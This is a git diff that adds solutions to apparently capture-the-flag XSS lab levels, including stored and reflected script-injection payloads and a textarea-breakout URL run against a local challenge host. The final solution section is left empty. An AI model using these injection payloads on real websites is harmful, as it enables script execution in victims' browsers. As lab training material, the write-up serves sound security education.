@@ -28,6 +28,12 @@ DEBUGGING: How do you debug these sorts of attacks? The most common thing to go 
 
 ## Solution
 
+POST HTTP Request with:
+
+```
+content	"<input>"
+```
+
 ---
 
 # 2
@@ -59,6 +65,12 @@ Second, your actual JavaScript might be buggy. JavaScript errors will show up on
 
 ## Solution
 
+POST:
+
+```
+<script>alert("PWNED");</script>
+```
+
 ---
 
 # 3
@@ -73,6 +85,10 @@ Anyways, this level is a Reflected XSS vulnerability. The /challenge/victim of t
 
 ## Solution
 
+```
+hacker@web-security~xss-3:/challenge$ ./victim "http://challenge.localhost/?msg=<script>alert('PWNED');</script>"
+```
+
 ---
 
 # 4
@@ -84,6 +100,10 @@ Like with SQL injection and command injection, sometimes your XSS occurs in the 
 As before, the /challenge/victim of this challenge takes a URL argument on the commandline, and it will visit that URL.
 
 ## Solution
+
+```
+hacker@web-security~xss-4:/challenge$ ./victim "http://challenge.localhost/?msg=</textarea>%0D%0A<script>alert("PWNED")</script>%0D%0A<textarea>"
+```
 
 ---
 
@@ -102,6 +122,8 @@ The JavaScript itself. Verify this by checking Firefox's JavaScript console for 
 The GET request that you'll trigger using fetch() or whatnot. You can, again, debug this in Firefox by looking at the Network tab of the Web Developer Tools. Have the tab open, trigger your attack, and see what's happening with the actual request.
 
 ## Solution
+
+
 
 ---
 
